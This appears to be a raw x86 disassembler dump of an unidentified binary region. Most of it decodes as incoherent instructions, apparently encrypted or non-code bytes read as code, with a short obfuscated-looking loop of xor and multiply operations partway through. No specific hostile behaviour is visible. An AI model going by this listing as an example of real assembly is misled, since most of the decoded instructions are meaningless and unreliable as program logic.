  41ed98:	es retf 0xe1f6
  41ed9c:	fstp   QWORD PTR [edi+0xc]
  41ed9f:	int    0x42
  41eda1:	gs xchg ecx,eax
  41eda3:	das    
  41eda4:	jno    0x41ed92
  41eda6:	or     DWORD PTR [esi+0x3c],eax
  41eda9:	pop    edx
  41edaa:	outs   dx,BYTE PTR ds:[esi]
  41edab:	xchg   esp,eax
  41edac:	or     al,0x1d
  41edae:	(bad)  
  41edaf:	std    
  41edb0:	inc    ecx
  41edb1:	mov    ds:0xc877dda6,eax
  41edb6:	push   ds
  41edb7:	mov    cl,0x96
  41edb9:	adc    ch,BYTE PTR [ecx]
  41edbb:	mov    al,ds:0x27b26d4c
  41edc0:	ds scas eax,DWORD PTR es:[edi]
  41edc2:	mov    ds:0x46723801,al
  41edc7:	adc    BYTE PTR [ebp+0x6a3cabec],cl
  41edcd:	lods   al,BYTE PTR ds:[esi]
  41edcf:	ret    0xcc6e
  41edd2:	lods   al,BYTE PTR ds:[esi]
  41edd3:	mov    bh,0xdb
  41edd5:	loop   0x41eddb
  41edd7:	xchg   ebp,eax
  41edd8:	out    dx,eax
  41edd9:	jmp    0x5d44a552
  41edde:	cli    
  41eddf:	aas    
  41ede0:	cmp    al,0x31
  41ede2:	sbb    BYTE PTR [eax+0x7f],bh
  41ede5:	out    0x4e,al
  41ede7:	lock push ds
  41ede9:	hlt    
  41edea:	jg     0x41ee27
  41edec:	sbb    eax,0x8bd5055d
  41edf1:	shl    DWORD PTR [edi-0x58967b82],0xb8
  41edf8:	xchg   dl,bl
  41edfa:	or     al,0xc4
  41edfc:	adc    DWORD PTR [esi+0x2d6e5b59],edi
  41ee02:	and    esp,DWORD PTR [edi]
  41ee04:	scas   al,BYTE PTR es:[edi]
  41ee05:	out    dx,al
  41ee06:	add    DWORD PTR [ebx],ebp
  41ee08:	cmp    dh,BYTE PTR [ebp+0x18]
  41ee0b:	xchg   esi,eax
  41ee0c:	inc    edx
  41ee0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee0e:	mov    eax,ds:0x33c8619b
  41ee13:	fmul   st(5),st
  41ee15:	pop    esp
  41ee16:	in     eax,0xa5
  41ee18:	repz push edx
  41ee1a:	sbb    BYTE PTR [edx],cl
  41ee1c:	not    DWORD PTR [ecx]
  41ee1e:	in     eax,dx
  41ee1f:	sti    
  41ee20:	dec    esi
  41ee21:	sub    BYTE PTR [eax-0x41],al
  41ee24:	repz cmp dh,BYTE PTR [eax-0x7b87e0e1]
  41ee2b:	sbb    BYTE PTR [esi],ch
  41ee2d:	pop    ebp
  41ee2e:	addr16 xchg ecx,eax
  41ee30:	test   al,0x1a
  41ee32:	and    esi,DWORD PTR [ecx+ebp*1+0x5999effc]
  41ee39:	mov    esp,0x1f1412b1
  41ee3e:	or     ecx,esp
  41ee40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee41:	sub    ebp,DWORD PTR [eax]
  41ee43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee44:	push   ebx
  41ee46:	mov    eax,ds:0x655abf97
  41ee4b:	jne    0x41eeb4
  41ee4d:	cld    
  41ee4e:	jmp    0xcaa6a12e
  41ee53:	shr    BYTE PTR [edi-0x48],cl
  41ee56:	out    dx,al
  41ee57:	add    bh,bl
  41ee59:	mov    ch,0xb8
  41ee5b:	push   ebx
  41ee5c:	sub    bl,al
  41ee5e:	or     al,0x66
  41ee60:	add    dl,BYTE PTR [esi]
  41ee62:	push   ecx
  41ee63:	cs mov ecx,0x7016eb32
  41ee69:	adc    DWORD PTR [ebx+0xb65e640],esi
  41ee6f:	lock out 0x26,al
  41ee72:	xchg   edi,eax
  41ee73:	mov    DWORD PTR [ebx],ecx
  41ee75:	or     eax,0x1b7c29e4
  41ee7a:	rcl    DWORD PTR [ebp-0x2d],0x90
  41ee7e:	mov    dh,0x83
  41ee80:	stc    
  41ee81:	loopne 0x41eeab
  41ee83:	xor    DWORD PTR [ecx+ebp*2-0x3f72fa89],ecx
  41ee8a:	(bad)
  41ee8d:	fisubr WORD PTR [edi-0x2a]
  41ee90:	push   ecx
  41ee91:	mov    cl,0xfc
  41ee93:	adc    al,BYTE PTR [eax+0x1c]
  41ee96:	add    edi,DWORD PTR [esi-0x7f68c496]
  41ee9c:	into   
  41ee9d:	sbb    ebp,ebx
  41ee9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eea0:	fstp   st(2)
  41eea2:	push   esi
  41eea3:	mov    dl,0xe2
  41eea5:	sbb    DWORD PTR [ebp+0x4d],esp
  41eea8:	out    dx,al
  41eea9:	into   
  41eeaa:	sub    al,0x42
  41eeac:	xchg   edi,eax
  41eead:	jbe    0x41ee63
  41eeaf:	jnp    0x41eec5
  41eeb1:	loope  0x41eebd
  41eeb3:	sub    eax,0xac64b5b6
  41eeb8:	ds and al,0x7e
  41eebb:	rcr    BYTE PTR [edx],0xb2
  41eebe:	mov    al,ds:0x356d9f0c
  41eec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eec4:	push   esp
  41eec5:	xchg   edi,eax
  41eec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eec7:	jmp    0x8894:0x2652c610
  41eece:	push   ds
  41eecf:	div    DWORD PTR [ecx-0x37]
  41eed2:	leave  
  41eed3:	add    DWORD PTR [edi],esi
  41eed5:	jle    0x41ef2a
  41eed7:	rcl    DWORD PTR [edx+0x77],0x1a
  41eedb:	dec    esp
  41eedc:	and    al,0xff
  41eede:	daa    
  41eedf:	dec    edi
  41eee0:	inc    ecx
  41eee1:	xchg   edx,eax
  41eee2:	mov    ebx,0x11e30a02
  41eee7:	cmp    ebx,edx
  41eee9:	xchg   esi,eax
  41eeea:	inc    esi
  41eeeb:	out    dx,al
  41eeec:	add    BYTE PTR [ebx+0x19],0x37
  41eef0:	mov    ds,WORD PTR [edx-0x4bedbf7]
  41eef6:	shr    DWORD PTR [edx+0x4c926f5],1
  41eefc:	pop    edi
  41eefd:	mov    ecx,0x3e10d0ad
  41ef02:	push   ecx
  41ef03:	fs add al,0x88
  41ef06:	mov    ch,0x3
  41ef08:	xchg   ebx,eax
  41ef09:	add    ecx,edi
  41ef0b:	sub    al,0x3b
  41ef0d:	inc    esp
  41ef0e:	add    eax,0x76a45970
  41ef13:	test   al,0xe5
  41ef15:	or     ebp,DWORD PTR [edi+ebp*1-0x22de6cb7]
  41ef1c:	(bad)  
  41ef1d:	fcomp  DWORD PTR [ebx]
  41ef1f:	icebp  
  41ef20:	push   ds
  41ef21:	add    BYTE PTR [ebp-0x2e],bl
  41ef24:	xor    al,0xc8
  41ef26:	out    dx,eax
  41ef27:	out    dx,al
  41ef28:	inc    esp
  41ef29:	jge    0x41ef70
  41ef2b:	fcomp  QWORD PTR [ecx]
  41ef2d:	test   BYTE PTR [ebp+esi*2-0x70540fa2],cl
  41ef34:	pop    ss
  41ef35:	(bad)  
  41ef37:	sub    cl,dl
  41ef39:	pop    edi
  41ef3a:	xor    eax,0x29ac5ffa
  41ef3f:	xor    dl,BYTE PTR [edi-0x1c]
  41ef42:	jg     0x41ef8f
  41ef44:	shl    BYTE PTR [edi],1
  41ef46:	jb     0x41ef18
  41ef48:	aad    0xf5
  41ef4a:	fs mov edx,0xa1276805
  41ef50:	ret    0x3e4e
  41ef53:	jno    0x41ef7a
  41ef55:	sub    bh,al
  41ef57:	pop    ds
  41ef58:	mov    bl,0x42
  41ef5a:	mov    ebx,0x8e8418b2
  41ef5f:	mov    ds:0x9606f1e2,al
  41ef64:	adc    ah,BYTE PTR [edx+ebx*4+0xb]
  41ef68:	lods   al,BYTE PTR ds:[esi]
  41ef69:	in     al,0x26
  41ef6b:	xchg   BYTE PTR [ebp-0x4e41c3fa],cl
  41ef71:	xchg   esi,eax
  41ef72:	add    BYTE PTR [edi],ch
  41ef74:	add    BYTE PTR [ecx+0x34ccdcdd],al
  41ef7a:	rol    BYTE PTR [ebp+eiz*2+0x59cdedf],1
  41ef81:	in     eax,0x4b
  41ef83:	pop    ebx
  41ef84:	fimul  WORD PTR [esi-0x69]
  41ef87:	sub    eax,0x583c2806
  41ef8c:	add    BYTE PTR [esi-0x4e],al
  41ef8f:	dec    edx
  41ef90:	and    eax,0x33bf5bad
  41ef95:	inc    ebp
  41ef96:	repz icebp 
  41ef98:	mov    ah,0xb2
  41ef9a:	idiv   DWORD PTR [edx+0x6]
  41ef9d:	outs   dx,BYTE PTR ds:[esi]
  41ef9e:	ss loopne 0x41ef79
  41efa1:	loopne 0x41ef75
  41efa3:	xchg   al,al
  41efa5:	shr    BYTE PTR [ebx-0x42],0xc5
  41efa9:	add    BYTE PTR [eax+0x29],0x6d
  41efad:	adc    eax,ebx
  41efaf:	lods   eax,DWORD PTR ds:[esi]
  41efb0:	push   esp
  41efb1:	mov    bl,0x7d
  41efb3:	cmp    eax,0xd72a648f
  41efb8:	inc    edx
  41efb9:	and    esp,DWORD PTR [esi+0x225747fb]
  41efbf:	call   0x5cf2e91
  41efc4:	(bad)  [ecx+0x69]
  41efc7:	mov    ds:0xf334119d,eax
  41efcc:	pop    esp
  41efcd:	mov    dh,0x7c
  41efcf:	test   dl,ch
  41efd1:	into   
  41efd2:	daa    
  41efd3:	test   al,0x76
  41efd5:	inc    ebx
  41efd6:	nop
  41efd7:	iret   
  41efd8:	adc    al,0x56
  41efda:	mov    edx,0x1dd908d2
  41efdf:	or     BYTE PTR [esi],dh
  41efe1:	and    BYTE PTR [ecx-0x41],dl
  41efe4:	mov    esp,0x1587ca55
  41efe9:	dec    ebx
  41efea:	sar    BYTE PTR [ecx+edi*2-0x7c3d6c75],0x22
  41eff2:	jg     0x41f042
  41eff4:	mov    WORD PTR [ecx+eiz*2-0x4f],cs
  41eff8:	ds dec si
  41effb:	push   edx
  41effc:	ins    DWORD PTR es:[edi],dx
  41effd:	xor    BYTE PTR [ebx],0xc8
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x52856403
  41f0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0c0:	jbe    0x41f113
  41f0c2:	fsub   DWORD PTR [ecx+0x62]
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx-0x4e]
  41f0ca:	adc    DWORD PTR [ecx],ebx
  41f0cc:	cmp    al,BYTE PTR [edx-0x16]
  41f0cf:	push   ebx
  41f0d0:	pop    edi
  41f0d1:	jmp    0x41f116
  41f0d3:	iret   
  41f0d4:	mov    ah,0xa7
  41f0d6:	fldcw  WORD PTR [edx+0x55ad8cfb]
  41f0dc:	dec    esp
  41f0dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0de:	jns    0x41f09b
  41f0e0:	in     eax,dx
  41f0e1:	and    al,0x20
  41f0e3:	daa    
  41f0e4:	mov    ebp,edi
  41f0e6:	or     eax,0x8778286c
  41f0eb:	or     BYTE PTR [ebp-0x28],al
  41f0ee:	into   
  41f0ef:	sub    dl,BYTE PTR [eax+0x34654edf]
  41f0f5:	or     BYTE PTR [ecx-0x23],0xa4
  41f0f9:	cwde   
  41f0fa:	aas    
  41f0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0fc:	push   cs
  41f0fd:	jp     0x41f13a
  41f0ff:	mov    ebx,DWORD PTR [edx+ecx*8]
  41f102:	ror    DWORD PTR [ecx+0x3e],cl
  41f105:	rol    bl,0xc1
  41f108:	lahf   
  41f109:	cli    
  41f10a:	cs and eax,0xf64b5d5f
  41f110:	ret    0x19eb
  41f113:	shl    DWORD PTR [edx],0x5d
  41f116:	out    0xd6,eax
  41f118:	sub    al,BYTE PTR [edx+0x57a2f992]
  41f11e:	cmp    edi,DWORD PTR [ebp+0x57]
  41f121:	mov    DWORD PTR [esi-0x6baac7e9],0x1a1870db
  41f12b:	es es cmc 
  41f12e:	jae    0x41f16d
  41f130:	and    al,0x91
  41f132:	rol    DWORD PTR [esi-0x5d],cl
  41f135:	mov    dl,0x13
  41f137:	inc    esi
  41f138:	dec    esp
  41f139:	adc    dh,BYTE PTR [ebx-0x67461deb]
  41f13f:	shr    DWORD PTR [ecx],cl
  41f141:	jmp    0x5fff:0xa7b9b2eb
  41f148:	cmp    DWORD PTR [edx],ebx
  41f14a:	call   0xb43a:0xbcbef88d
  41f151:	mov    bl,0x11
  41f153:	mov    bl,0x66
  41f155:	mov    WORD PTR [ebx+0x39],cs
  41f158:	mov    DWORD PTR [eax-0x2034cfb5],esi
  41f15e:	sahf   
  41f15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f160:	arpl   bp,dx
  41f162:	add    ebp,DWORD PTR [edi+0x4f]
  41f165:	xchg   dl,dh
  41f167:	dec    ebp
  41f168:	lahf   
  41f169:	(bad)  
  41f16a:	jb     0x41f122
  41f16c:	pop    ebx
  41f16d:	mov    ds:0xdd28a000,eax
  41f172:	ret    0xbdaa
  41f175:	lahf   
  41f176:	dec    esp
  41f177:	sahf   
  41f178:	pop    ecx
  41f179:	adc    ch,BYTE PTR [eax-0x57a2575c]
  41f17f:	aam    0x13
  41f181:	outs   dx,BYTE PTR ds:[esi]
  41f182:	cmp    ebp,eax
  41f184:	inc    ecx
  41f185:	rcl    DWORD PTR [ebp+ebp*4+0x1cfac436],0x26
  41f18d:	xor    eax,0xeed0568c
  41f192:	add    dl,BYTE PTR [ecx+0x1a]
  41f195:	ins    BYTE PTR es:[edi],dx
  41f196:	scas   al,BYTE PTR es:[edi]
  41f197:	inc    esp
  41f198:	call   0x10e7c6ca
  41f19d:	xchg   esp,eax
  41f19e:	sub    esi,DWORD PTR [esi-0x3e]
  41f1a1:	(bad)  
  41f1a2:	pop    ss
  41f1a3:	mov    ebp,0x9fb8b835
  41f1a8:	stos   DWORD PTR es:[edi],eax
  41f1a9:	outs   dx,DWORD PTR ds:[esi]
  41f1aa:	jmp    0xac3586b5
  41f1af:	je     0x41f162
  41f1b1:	mov    dl,0xb6
  41f1b3:	out    dx,al
  41f1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1b5:	and    ebp,DWORD PTR [edx-0x3a37b355]
  41f1bb:	(bad)  
  41f1bc:	jae    0x41f21e
  41f1be:	(bad)  
  41f1bf:	sbb    ch,BYTE PTR [esi-0x3b]
  41f1c2:	xchg   ebp,eax
  41f1c3:	push   esp
  41f1c4:	push   0xe45d0c8
  41f1c9:	push   0xffffffac
  41f1cb:	or     bl,ah
  41f1cd:	lock xchg ebx,eax
  41f1cf:	retf   
  41f1d0:	ficomp DWORD PTR [edx+0x2f]
  41f1d3:	test   edx,esp
  41f1d5:	mov    ds:0x5d023e5c,eax
  41f1da:	push   esi
  41f1db:	or     dh,BYTE PTR [ebp-0x1a]
  41f1de:	fnstcw WORD PTR [ebx]
  41f1e0:	mov    bl,BYTE PTR [esi-0xd]
  41f1e3:	and    ch,BYTE PTR [edx]
  41f1e5:	ins    DWORD PTR es:[edi],dx
  41f1e6:	ficom  WORD PTR [ebp+0x4ef5d26c]
  41f1ec:	dec    esi
  41f1ed:	not    DWORD PTR ds:0xaaea889d
  41f1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1f4:	cmp    eax,0xa2f0de4e
  41f1f9:	cmp    BYTE PTR [edx+0x11],ch
  41f1fc:	sub    BYTE PTR [edi+0x5c94cce3],0x53
  41f203:	gs mov dl,0x95
  41f206:	fist   WORD PTR [esi]
  41f208:	fidiv  WORD PTR [ebp-0xa]
  41f20b:	xlat   BYTE PTR es:[ebx]
  41f20d:	in     eax,dx
  41f20e:	std    
  41f20f:	addr16 pop edx
  41f211:	sbb    BYTE PTR [ebx+0x5c509665],bl
  41f217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f218:	push   es
  41f219:	add    al,0x6
  41f21b:	xchg   edx,eax
  41f21c:	in     eax,dx
  41f21d:	in     al,dx
  41f21e:	mov    BYTE PTR [ebp+0x61],0xcd
  41f222:	dec    eax
  41f223:	outs   dx,DWORD PTR ds:[si]
  41f225:	adc    BYTE PTR ds:[ecx+0x2225d52c],ch
  41f22c:	inc    esi
  41f22d:	dec    ebx
  41f22e:	xchg   ebp,eax
  41f22f:	fcomp  QWORD PTR [ebx-0x34]
  41f232:	in     ax,0xc5
  41f235:	xor    esi,DWORD PTR [ebp+0x4746ce34]
  41f23b:	shl    DWORD PTR [eax],1
  41f23d:	cwde   
  41f23e:	cmp    BYTE PTR [edi+esi*4],bh
  41f241:	dec    edx
  41f242:	(bad)  
  41f243:	in     eax,dx
  41f244:	loop   0x41f29b
  41f246:	call   0x5812accd
  41f24b:	mov    gs,WORD PTR [ebx+0x3eb6323b]
  41f251:	mov    ah,0x63
  41f253:	sub    al,0x3e
  41f255:	jo     0x41f259
  41f257:	in     eax,0xc
  41f259:	or     DWORD PTR [edi+0x41],edx
  41f25c:	(bad)
  41f260:	addr16 lock pop eax
  41f263:	pop    ss
  41f264:	pop    ss
  41f265:	pop    edi
  41f266:	cwde   
  41f267:	jle    0x41f2c1
  41f269:	or     ecx,DWORD PTR [ebx]
  41f26b:	jg     0x41f1f6
  41f26d:	sub    al,0x64
  41f26f:	push   0xffffffdc
  41f271:	aad    0x7b
  41f273:	sbb    al,bh
  41f275:	sbb    al,0x4f
  41f277:	aad    0x5c
  41f279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f27a:	loopne 0x41f2c8
  41f27c:	ds add edx,esp
  41f27f:	inc    edx
  41f280:	mov    dh,0xf4
  41f282:	cmp    BYTE PTR [ecx-0x5c29503d],ch
  41f288:	fcom   QWORD PTR [esi]
  41f28a:	inc    esp
  41f28b:	ret    0x570
  41f28e:	xchg   DWORD PTR [esp+ebx*1],ebp
  41f291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f292:	inc    edx
  41f294:	fadd   QWORD PTR [edi-0x19]
  41f297:	mov    ds:0x8a94c2a5,eax
  41f29c:	sub    eax,0xc4762f89
  41f2a1:	fs cmp al,0x46
  41f2a4:	pop    ds
  41f2a5:	lods   al,BYTE PTR ds:[esi]
  41f2a6:	mov    ds:0x4be79150,eax
  41f2ab:	repnz and esp,DWORD PTR [ebp-0x6e0fdc0f]
  41f2b2:	loopne 0x41f27f
  41f2b4:	les    eax,FWORD PTR [eax+0x6e]
  41f2b7:	dec    esi
  41f2b8:	repz sub ebx,DWORD PTR [ebx-0x1e8c423c]
  41f2bf:	retf   0xf822
  41f2c2:	out    dx,al
  41f2c3:	fistp  WORD PTR [ecx+0x2fa615fb]
  41f2c9:	retf   0xd1ea
  41f2cc:	in     eax,0x4a
  41f2ce:	iret   
  41f2cf:	cmp    BYTE PTR [ebp+0x542a5133],ah
  41f2d5:	jle    0x41f25c
  41f2d7:	or     eax,0xe5b6f589
  41f2dc:	mov    ds:0xcbaf135,al
  41f2e1:	jmp    0x92c7:0x7f742673
  41f2e8:	loopne 0x41f2f0
  41f2ea:	mov    esi,0x31ea4b7
  41f2ef:	adc    ebx,DWORD PTR [edi]
  41f2f1:	fisub  WORD PTR [edx-0x1285df9a]
  41f2f7:	into   
  41f2f8:	pusha  
  41f2f9:	sub    al,BYTE PTR [eax]
  41f2fb:	lods   al,BYTE PTR ds:[esi]
  41f2fc:	xor    al,0x53
  41f2fe:	adc    DWORD PTR [esi],0x2074adea
  41f304:	in     al,dx
  41f305:	jne    0x41f361
  41f307:	sub    DWORD PTR [eax+0x68f74c4c],0x586b1792
  41f311:	and    al,0x73
  41f313:	and    al,dl
  41f315:	ror    BYTE PTR [edx],1
  41f317:	dec    esi
  41f318:	sbb    DWORD PTR [edi+0x5dea971a],esi
  41f31e:	and    eax,0xef07fcec
  41f323:	xchg   edx,eax
  41f324:	ins    DWORD PTR es:[edi],dx
  41f325:	and    BYTE PTR [ecx-0x15],bh
  41f328:	adc    DWORD PTR [ecx],edi
  41f32a:	call   0x52079bfa
  41f32f:	ret    0x75c4
  41f332:	idiv   BYTE PTR [edi-0x49]
  41f335:	or     DWORD PTR [edi+0x36],0x1d74208
  41f33c:	mov    al,ds:0x513e42e0
  41f341:	mov    ebx,0x11de7bc9
  41f346:	shr    DWORD PTR [esi],0xd9
  41f349:	push   es
  41f34a:	add    al,0x7f
  41f34c:	and    BYTE PTR [esi-0x488a4145],bh
  41f352:	push   ecx
  41f353:	pop    ds
  41f354:	clc    
  41f355:	mov    ds:0xa76d64e,al
  41f35a:	lock mov ch,cl
  41f35d:	in     eax,dx
  41f35e:	push   0x6ebfcaef
  41f363:	mov    dl,0xbd
  41f365:	aas    
  41f366:	test   DWORD PTR [eax-0x2499b8ee],ebx
  41f36c:	gs out dx,eax
  41f36e:	ficomp WORD PTR [edi]
  41f370:	icebp  
  41f371:	sub    al,0x68
  41f373:	push   eax
  41f374:	and    eax,0x568ee73b
  41f379:	fnsave [edi+0x4]
  41f37c:	imul   ecx,edi,0xed731798
  41f382:	cli    
  41f383:	xchg   esp,eax
  41f384:	fadd   st(1),st
  41f386:	scas   al,BYTE PTR es:[edi]
  41f387:	mov    edx,DWORD PTR [edi+0x7f]
  41f38a:	dec    eax
  41f38b:	sahf   
  41f38c:	outs   dx,BYTE PTR ds:[esi]
  41f38d:	stos   DWORD PTR es:[edi],eax
  41f38e:	xor    al,0xec
  41f390:	sar    edx,1
  41f392:	cmp    ebp,DWORD PTR [eax]
  41f394:	sub    al,0x4d
  41f396:	in     al,0x43
  41f398:	xchg   esi,ebx
  41f39a:	xchg   ebx,eax
  41f39b:	leave  
  41f39c:	mov    ds:0x1c03e809,al
  41f3a1:	gs xor eax,0x678abd8e
  41f3a7:	dec    ebx
  41f3a8:	xor    ch,ah
  41f3aa:	pop    esi
  41f3ab:	push   ecx
  41f3ac:	(bad)  
  41f3ad:	loopne 0x41f3b2
  41f3af:	mov    eax,0xb029a79c
  41f3b4:	rol    ah,0xa7
  41f3b7:	jl     0x41f420
  41f3b9:	loop   0x41f402
  41f3bb:	adc    eax,esi
  41f3bd:	jge    0x41f368
  41f3bf:	mov    dl,0xfc
  41f3c1:	dec    ebp
  41f3c2:	mov    ebp,0xc28c2514
  41f3c7:	adc    DWORD PTR [ebx-0x17],eax
  41f3ca:	sahf   
  41f3cb:	int    0xe7
  41f3cd:	(bad)  
  41f3ce:	imul   edi,DWORD PTR [edx+0x64],0xffffff8d
  41f3d2:	in     eax,dx
  41f3d3:	in     al,dx
  41f3d4:	pop    ss
  41f3d5:	sub    eax,0x1d22698a
  41f3da:	je     0x41f3c8
  41f3dc:	add    BYTE PTR [esi+0x51],bh
  41f3df:	mov    eax,ds:0xb6f74d39
  41f3e4:	or     BYTE PTR [edi],ch
  41f3e6:	idiv   BYTE PTR [eax+0x37]
  41f3e9:	fst    DWORD PTR [eax]
  41f3eb:	in     eax,dx
  41f3ec:	sbb    ebx,DWORD PTR [ebp+eax*4-0x653362f6]
  41f3f3:	mov    cl,0xd3
  41f3f5:	gs mov esi,0xaec4f0ae
  41f3fb:	and    al,0x9a
  41f3fd:	cmp    esi,ebx
  41f3ff:	mov    cl,BYTE PTR [edx+0x3c]
  41f402:	push   es
  41f403:	dec    ebx
  41f404:	or     BYTE PTR [edi],bl
  41f406:	dec    ecx
  41f407:	pop    ebp
  41f408:	pushf  
  41f409:	enterw 0xa032,0x7f
  41f40e:	aas    
  41f40f:	pop    edx
  41f410:	fwait
  41f411:	and    DWORD PTR [eax+0x2a],ebx
  41f414:	jg     0x41f3ac
  41f416:	pop    ecx
  41f417:	ret    
  41f418:	add    DWORD PTR [edi-0x36721c46],edi
  41f41e:	push   ss
  41f41f:	lods   al,BYTE PTR ds:[esi]
  41f420:	and    cl,BYTE PTR [ecx]
  41f422:	mov    ds:0x2befdc89,eax
  41f427:	(bad)  
  41f428:	es sub eax,0xe2219a95
  41f42e:	daa    
  41f42f:	(bad)  [ecx+0x7f]
  41f432:	adc    esi,DWORD PTR [ecx]
  41f434:	dec    esp
  41f435:	mov    eax,0x19bac12
  41f43a:	in     al,0x51
  41f43c:	adc    ebx,DWORD PTR [ebp+0x3f5d3107]
  41f442:	lods   al,BYTE PTR ds:[esi]
  41f443:	sub    eax,0x730e4c33
  41f448:	mov    ch,0xaf
  41f44a:	jl     0x41f438
  41f44c:	pop    es
  41f44d:	adc    eax,0x4e5b0ff9
  41f452:	sbb    al,0x3e
  41f454:	shr    BYTE PTR [edx+0x1c052f43],0x20
  41f45b:	(bad)  
  41f45c:	sbb    ch,BYTE PTR [eax+0x6165ec51]
  41f462:	cld    
  41f463:	jle    0x41f4c4
  41f465:	or     eax,0xed3adfea
  41f46a:	push   ebp
  41f46b:	xor    eax,0xffffffc4
  41f46e:	iret   
  41f46f:	ss in  eax,0xab
  41f472:	cmp    DWORD PTR [edx],ebp
  41f474:	and    eax,0xffb9737e
  41f479:	data16 or dh,dh
  41f47c:	(bad)  
  41f47d:	sahf   
  41f47e:	iret   
  41f47f:	xor    BYTE PTR [ebp+eax*1+0x4d],bh
  41f483:	dec    ebx
  41f484:	jmp    0x785e:0x9acc3b48
  41f48b:	imul   ebp,ecx,0xd1e9be0b
  41f491:	(bad)  
  41f492:	ds sbb dl,dl
  41f495:	ss jle 0x41f516
  41f498:	jbe    0x41f50b
  41f49a:	push   edi
  41f49b:	add    al,0xdb
  41f49d:	inc    ebx
  41f49e:	ins    DWORD PTR es:[edi],dx
  41f49f:	inc    edx
  41f4a0:	and    BYTE PTR [edx],ch
  41f4a2:	data16 je 0x41f448
  41f4a5:	push   edx
  41f4a6:	adc    BYTE PTR [esp+ebx*4],0x7
  41f4aa:	lods   eax,DWORD PTR fs:[esi]
  41f4ac:	jb     0x41f502
  41f4ae:	in     al,dx
  41f4af:	push   edi
  41f4b0:	push   ds
  41f4b1:	mov    WORD PTR [esi*8+0x3452bc3e],ss
  41f4b8:	cmp    ch,cl
  41f4ba:	push   eax
  41f4bb:	aam    0x4a
  41f4bd:	push   ebx
  41f4be:	cmp    al,0xe5
  41f4c0:	add    eax,0xfc64ff15
  41f4c5:	xchg   DWORD PTR [esi-0x3e],ecx
  41f4c8:	lods   al,BYTE PTR ds:[esi]
  41f4c9:	lods   al,BYTE PTR ds:[esi]
  41f4ca:	xor    al,0x4a
  41f4cc:	neg    BYTE PTR fs:[ebp+0x643f26a3]
  41f4d3:	call   0x84bef59d
  41f4d8:	or     ebx,ecx
  41f4da:	mov    bh,BYTE PTR [eax+0x61]
  41f4dd:	cmp    DWORD PTR [edi+ebx*8-0x3605529d],ebx
  41f4e4:	mov    ebp,0x273c1fe7
  41f4e9:	stc    
  41f4ea:	shr    dh,1
  41f4ec:	test   eax,0xbecafafe
  41f4f1:	mov    ebx,0xd6be2cfe
  41f4f6:	inc    esp
  41f4f7:	fmul   QWORD PTR [ebx]
  41f4f9:	mov    cs,WORD PTR [ebx-0x2dffec12]
  41f4ff:	mov    edi,0x65530b00
  41f504:	rcr    DWORD PTR [edi-0x6ed8b04c],cl
  41f50a:	sbb    eax,DWORD PTR [ebx+ebp*1]
